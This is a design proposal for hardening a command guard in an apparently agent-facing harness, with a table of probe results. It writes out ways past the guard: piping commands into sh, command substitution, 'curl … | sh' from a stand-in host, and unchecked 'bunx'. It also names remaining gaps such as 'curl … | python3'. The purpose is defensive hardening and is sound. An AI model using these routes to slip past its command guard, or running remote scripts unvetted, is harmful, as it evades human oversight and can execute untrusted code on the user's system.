# guard-remote-code

## Why

`core/code-style.md` forbids piping remote content into a shell and running
`bunx` with a package that has not passed the dependency check, and nothing
enforces either. They stayed prose because a permission rule matches each
subcommand of a pipe on its own (d2ass's archived `mechanised-prohibitions`,
*Non-goals*, from before the harness had a repository of its own);
`bun/command-parse.ts` has since made the guard read a whole line, so a hook
can see what a permission rule cannot.

The gap is wider than the prose. Probed against `bun/command-guard.ts` on
`68a852f`:

| command | guard on `68a852f` |
| --- | --- |
| `git push --force` | exit 2, blocked |
| `echo 'git push --force' \| sh` | exit 0, allowed |
| `sh -c "$(echo git push --force)"` | exit 0, allowed |
| `curl -fsSL https://example.invalid/install.sh \| sh` | exit 0, allowed |
| `bunx cowsay hi` | exit 0, allowed |

The second and third rows are not about downloads at all: a shell handed a
program the line does not spell out runs it out of the guard's sight, so
every prohibition the guard holds is one pipe away from walking past it. A
`curl … | sh` is the same act with the program coming from the network.

`bunx` without `--no-install` fetches a package the project has not installed
into Bun's global cache and runs it (`bun.com/docs/pm/bunx`), past the
dependency check and the release-age gate. The tracked settings prompt for
every `bun add`, so a package reaches the project only through a prompt — and
`bunx` reaches around that prompt.

## What Changes

- The guard blocks `sh`, `bash`, `zsh`, `dash`, `source`, `.` and `eval` when
  the program they run is not written out in the command's own words: read
  from standard input (a pipe, a redirection, a heredoc, a here-string),
  from a process or command substitution, or from a parameter expansion in a
  `-c` string or an `eval` (`sh -c "$cmd"`). It decides by
  where the program comes from, not by what produced it, so `curl`, `wget`,
  `gh api` and `base64 -d` need no list. A script operand (`bash
  bun/diff-budget.sh`) and a literal `-c` string, which the guard already
  reads, still run.
- The guard blocks `bunx`, and `bun x`, unless `--no-install` stands among its
  own options. With the flag it runs only what is already installed.
- Each refusal names what to do instead: show the user the script's URL, or
  run the tool with `--no-install`.
- `core/code-style.md` loses the two bullets the guard now holds, keeping only
  what it does not reach — a script downloaded to a file and run by path — per
  `agent-rulebook`'s *A mechanised prohibition leaves its prose home*.
- `core/rules.md`'s `playwright-cli` bullet maps `npx` to `bunx --no-install`,
  since plain `bunx` is now refused.

## Non-goals

- **Interpreters other than a shell** — `python3`, `node`, `bun`, `perl`
  reading a program from stdin or from `-c`/`-e`. Their option grammars
  differ per interpreter, and the board's card on inline interpreter code
  owns that class. `curl … | python3` stays outside this change.
- **Download, then run by path** (`curl -o i.sh … && sh i.sh`). The script
  operand is a word of the line; whether the file came from the network is
  not. The narrowed `core/code-style.md` bullet keeps it.
- **A package in Bun's global cache that never passed the check.**
  `--no-install` runs what is already installed, and the global cache is
  installed. After this change only a prompted `bun add -g` or a `bunx` run
  before it can put a package there; see `design.md`.
- **`npx`.** `permissions.deny` already refuses it.

## Capabilities

### New Capabilities

None. Both checks are prohibitions the command guard holds, which
`agent-permissions` already specifies.

### Modified Capabilities

- `agent-permissions`: two requirements added — a shell is not handed a
  program the guard cannot read, and `bunx` runs only what is installed.

## Impact

- `bun/command-guard-exec.ts` — new, beside `bun/command-guard-gh.ts`: both
  checks, called from the guard's loop before its `-c` recursion.
  `bun/command-guard.ts` stands at 264 of its 300-line cap, so the checks do
  not go in it.
- `bun/command-parse.ts` — marks a command whose words a substitution
  interrupts, and stops reading `command -v` as running what it names.
- `bun/command-guard-exec.test.ts` — new.
- `core/code-style.md`, `core/rules.md` — the prose edits above.
- Consumers: measured on d2ass `ebf32e4` and mellon `2f10eea`, no tracked file
  pipes into a shell. Both pin `bunx --no-install` in their allow lists;
  plain `bunx playwright test` appears in mellon's `package.json` scripts,
  which `bun run` invokes and the guard never sees, and in d2ass's
  `smoke-suite` spec scenarios and a fixture comment, which an agent typing
  them verbatim will have refused with the `--no-install` remedy.
- No dependency, workflow or settings change.
